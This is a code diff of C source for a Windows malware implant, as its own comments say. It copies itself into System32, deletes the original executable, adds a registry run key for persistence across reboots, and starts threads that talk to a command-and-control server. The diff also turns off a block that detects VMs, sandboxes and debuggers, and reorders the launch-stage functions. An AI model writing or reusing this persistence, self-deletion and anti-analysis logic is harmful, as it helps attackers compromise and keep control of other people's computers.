@@ -11,7 +11,7 @@
 static void copyToSys32AndLaunch(char* path);
 static void runFromRegistry(char** argv);
 static void firstRunFromSys32(char** argv);
-static void run();
+static void exec();
 
 static void check();
 
@@ -44,7 +44,7 @@ int main(int argc, char** argv) {
     );
 #endif
 
-#if 1
+#if 0
     // detect vms, sandboxes, and debuggers!
     RET_CODE ret = detectAnalysisTools();
     if (ret != R_SAFE_RET) {
@@ -53,23 +53,26 @@ int main(int argc, char** argv) {
     }
 #endif
 
+    // returns true on if our 32-bit process is running in a 64-bit machine
     PVOID __tmp__;
-    // returns true on if our 32-bit process is running in a 64-bit machine 
     is64BitMachine = Wow64DisableWow64FsRedirection(&__tmp__);
 
+    // this switch statement is in the order each of these methods will be triggered
+    // ew first copy and launch from sys32, then run from sys32 and create reg keys.
+    // Then runFromRegistry only gets invoked on client machine restart
     switch (argc) {
         case 1:  // launched for the first time
             copyToSys32AndLaunch(argv[0]);
             break;
-        case 2:  // run from the registry key 
-            runFromRegistry(argv);
-            break;
         case 3:  // run from the copy and launch
             firstRunFromSys32(argv);
             break;
+        case 2:  // run from the registry key 
+            runFromRegistry(argv);
+            break;
     }
 
-    Wow64RevertWow64FsRedirection(__tmp__);
+    if (is64BitMachine) { Wow64RevertWow64FsRedirection(__tmp__); }
     return 0;
 }
 
@@ -110,25 +113,6 @@ static void copyToSys32AndLaunch(char* path) {
     char cmd[MAX_PATH];
     snprintf(cmd, MAX_PATH, "\"%s\" %s \"%s\"", SYS32_PATH, DELETE_FLG, path);
     CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-
-    printf("Exiting worker...\n");
-}
-
-/**
- * Only gets envoked when the malware has been run from the registry key.
- * Simply checks that the path is in System32 and -007 was passed! 
- * 
- * @param argv command line args 
- */
-static void runFromRegistry(char** argv) {
-    char* path = argv[0];
-    char* arg = argv[1];
-    if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
-        return;
-    }
-
-    Sleep(30000);
-    run();
 }
 
 /**
@@ -145,23 +129,46 @@ static void firstRunFromSys32(char** argv) {
     if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, DELETE_FLG) != 0) {
         exit(0);
     }
+
+    // super important to sleep for 2s here, gives the original process 
+    // time to gracefully close so we can delete the original file
+    Sleep(2000);
+
     // delete the orignal malware file!
-    DeleteFileA(delPath);
-    printf("Deleting %s...", path);
+    WINBOOL retb = DeleteFileA(delPath);
+    printf("Deleting %s %d...\n\n", delPath, retb);
     
     // check for 64 bit machine, add the KEY_WOW64_64KEY flag if we are in one
-    LONG access = KEY_WRITE;
+    LONG regAccess = KEY_WRITE;
     if (is64BitMachine) {
-        access |= KEY_WOW64_64KEY;
+        regAccess |= KEY_WOW64_64KEY;
     }
 
-    RET_CODE ret = generateRegKey(SYS32_PATH, RUN_FROM_REGISTRY, access);
+    RET_CODE ret = generateRegKey(SYS32_PATH, RUN_FROM_REGISTRY, regAccess);
     if (ret != R_SUCCESS) {
         printf("Failed to generate registry key.\n");
         return;
     }
 
-    run();
+    exec();
+}
+
+/**
+ * Only gets envoked when the malware has been run from the registry key.
+ * Simply checks that the path is in System32 and -007 was passed! 
+ * 
+ * @param argv command line args 
+ */
+static void runFromRegistry(char** argv) {
+    char* path = argv[0];
+    char* arg = argv[1];
+    if (strcmp(path, SYS32_PATH) != 0 || strcmp(arg, RUN_FROM_REGISTRY) != 0) {
+        printf("Failed to run from reg!");
+        return;
+    }
+
+    Sleep(30000);
+    exec();
 }
 
 /**
@@ -170,7 +177,7 @@ static void firstRunFromSys32(char** argv) {
  * then calls startThreads to begin regular communication with the 
  * C2 server. 
  */
-static void run() {
+static void exec() {
     RET_CODE ret = setup();
     if (ret != R_SUCCESS) {
         printRetCode(ret);
